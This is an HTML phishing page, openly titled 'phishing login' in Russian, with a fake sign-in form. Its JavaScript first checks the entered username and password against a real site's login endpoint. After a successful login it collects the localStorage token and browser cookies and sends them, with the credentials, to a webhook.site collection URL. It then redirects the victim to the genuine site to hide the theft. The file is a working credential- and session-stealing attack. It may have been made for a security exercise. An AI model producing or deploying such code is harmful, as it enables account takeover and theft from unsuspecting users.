<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <title>Фишинг логин</title>
  <style>
    body { font-family: sans-serif; padding: 30px; text-align: center; }
    input, button { padding: 10px; margin: 10px; width: 250px; }
    .error { color: red; }
  </style>
</head>
<body>
  <h2>Вход в систему</h2>
  <form id="loginForm">
    <input type="text" id="username" placeholder="Логин" required><br>
    <input type="password" id="password" placeholder="Пароль" required><br>
    <button type="submit">Войти</button>
  </form>
  <p class="error" id="errorMessage"></p>

  <script>
    const webhook = "https://webhook.site/6b77aea8-855b-4976-9d7e-a9e447b3b291";

    document.getElementById("loginForm").addEventListener("submit", async function (e) {
      e.preventDefault();

      const username = document.getElementById("username").value;
      const password = document.getElementById("password").value;
      const errorMsg = document.getElementById("errorMessage");

      try {
        const res = await fetch("https://kazcyber.zapto.org/logindemo.php", {
          method: "POST",
          headers: {
            "Content-Type": "application/x-www-form-urlencoded"
          },
          credentials: "include",
          body: `username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`
        });

        const text = await res.text();
        const isSuccess = !text.toLowerCase().includes("неверный");

        if (isSuccess) {
          // подождать, чтобы token успел сохраниться в localStorage
          setTimeout(async () => {
            const token = localStorage.getItem("token");
            const cookies = document.cookie;

            await fetch(webhook, {
              method: "POST",
              headers: {
                "Content-Type": "application/json"
              },
              body: JSON.stringify({
                username,
                password,
                token,
                cookie: cookies
              })
            });

            // переходим на оригинальный сайт
            window.location.href = "https://kazcyber.zapto.org/index.php";
          }, 700);
        } else {
          errorMsg.textContent = "❌ Неверный логин или пароль";
        }
      } catch (err) {
        errorMsg.textContent = "⚠️ Ошибка соединения с сервером";
      }
    });
  </script>
</body>
</html>
